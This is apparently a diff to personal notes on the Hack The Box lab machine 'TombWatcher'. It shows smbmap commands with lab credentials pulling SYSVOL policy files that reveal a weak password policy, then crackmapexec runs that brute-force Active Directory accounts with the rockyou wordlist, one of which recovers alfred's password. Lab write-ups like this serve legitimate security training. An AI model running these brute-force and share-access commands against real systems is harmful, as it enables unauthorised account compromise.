@@ -529,4 +529,130 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
         fr--r--r--             4920 Mon Jun  9 14:09:42 2025    GptTmpl.inf
 [*] Closed 1 connections  
 ```
-Download files via SMBMAP: `smbmap -H 10.10.11.72 -u "henry" -p "H3nry_987TGV!" -d tombwatcher.htb --download 'SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf'`
+Download files via SMBMAP:
+- `smbmap -H 10.10.11.72 -u "henry" -p "H3nry_987TGV!" -d tombwatcher.htb --download 'SYSVOL/tombwatcher.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf'`
+- `smbmap -H 10.10.11.72 -u "henry" -p "H3nry_987TGV!" -d tombwatcher.htb --download 'SYSVOL/tombwatcher.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf'`
+
+```py
+┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/Boxes/TombWatcher/windapsearch]
+└─# cat '10.10.11.72-SYSVOL_tombwatcher.htb_Policies_{6AC1786C-016F-11D2-945F-00C04fB984F9}_MACHINE_Microsoft_Windows NT_SecEdit_GptTmpl.inf' ��[Unicode]
+Unicode=yes
+[Registry Values]
+MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
+MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
+MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
+MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
+[Version]
+signature="$CHICAGO$"
+Revision=1
+[Privilege Rights]
+SeAssignPrimaryTokenPrivilege = *S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236,*S-1-5-20,*S-1-5-19,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595
+SeAuditPrivilege = *S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236,*S-1-5-20,*S-1-5-19,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595
+SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
+SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544,*S-1-5-32-568
+SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
+SeCreatePagefilePrivilege = *S-1-5-32-544
+SeDebugPrivilege = *S-1-5-32-544
+SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544
+SeIncreaseQuotaPrivilege = *S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595
+SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
+SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
+SeMachineAccountPrivilege = *S-1-5-11
+SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
+SeProfileSingleProcessPrivilege = *S-1-5-32-544
+SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
+SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
+SeSecurityPrivilege = *S-1-5-32-544
+SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
+SeSystemEnvironmentPrivilege = *S-1-5-32-544
+SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
+SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
+SeTakeOwnershipPrivilege = *S-1-5-32-544
+SeUndockPrivilege = *S-1-5-32-544
+SeEnableDelegationPrivilege = *S-1-5-32-544
+
+┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/Boxes/TombWatcher/windapsearch]
+└─# cat '10.10.11.72-SYSVOL_tombwatcher.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Microsoft_Windows NT_SecEdit_GptTmpl.inf' ��[Unicode]
+Unicode=yes
+[System Access]
+MinimumPasswordAge = 0
+MaximumPasswordAge = -1
+MinimumPasswordLength = 1
+PasswordComplexity = 0
+PasswordHistorySize = 24
+LockoutBadCount = 0
+RequireLogonToChangePassword = 0
+ForceLogoffWhenHourExpire = 0
+ClearTextPassword = 0
+LSAAnonymousNameLookup = 0
+[Kerberos Policy]
+MaxTicketAge = 10
+MaxRenewAge = 7
+MaxServiceAge = 600
+MaxClockSkew = 5
+TicketValidateClient = 1
+[Version]
+signature="$CHICAGO$"
+Revision=1
+[Registry Values]
+MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
+```
+```py
+[System Access]
+MinimumPasswordLength = 1          # Only 1 character minimum!
+PasswordComplexity = 0             # No complexity requirements!  
+MaximumPasswordAge = -1            # Passwords NEVER expire
+LockoutBadCount = 0                # NO account lockout policy
+```
+Try some bruteforcing Alred's account: Copy rockyou locally: `cp /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt .`
+`crackmapexec smb 10.10.11.72 -u alfred -p rockyou.txt`
+Eventualy...
+```py
+SMB         10.10.11.72     445    DC01             [-] tombwatcher.htb\alfred:joshua STATUS_LOGON_FAILURE 
+SMB         10.10.11.72     445    DC01             [-] tombwatcher.htb\alfred:bubbles STATUS_LOGON_FAILURE 
+SMB         10.10.11.72     445    DC01             [-] tombwatcher.htb\alfred:1234567890 STATUS_LOGON_FAILURE 
+SMB         10.10.11.72     445    DC01             [-] tombwatcher.htb\alfred:superman STATUS_LOGON_FAILURE 
+SMB         10.10.11.72     445    DC01             [-] tombwatcher.htb\alfred:hannah STATUS_LOGON_FAILURE 
+SMB         10.10.11.72     445    DC01             [-] tombwatcher.htb\alfred:amanda STATUS_LOGON_FAILURE 
+SMB         10.10.11.72     445    DC01             [-] tombwatcher.htb\alfred:loveyou STATUS_LOGON_FAILURE 
+SMB         10.10.11.72     445    DC01             [-] tombwatcher.htb\alfred:pretty STATUS_LOGON_FAILURE 
+SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\alfred:basketball 
+```
+Test Alfed's access:
+```py
+┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/Boxes/TombWatcher/windapsearch]
+└─# smbmap -H 10.10.11.72 -u "alfred" -p "basketball" -d tombwatcher.htb
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 10.10.11.72:445 Name: 10.10.11.72               Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+[*] Closed 1 connections
+```
+Doesn't seem to be any different at face value - trying for other accounts: `crackmapexec smb 10.10.11.72 -u john -p rockyou.txt`
+```py
+
+```
+Next: crackmapexec smb 10.10.11.72 -u sam -p rockyou.txt 
+```py
+
+```
+Next: crackmapexec smb 10.10.11.72 -u Administrator -p rockyou.txt 
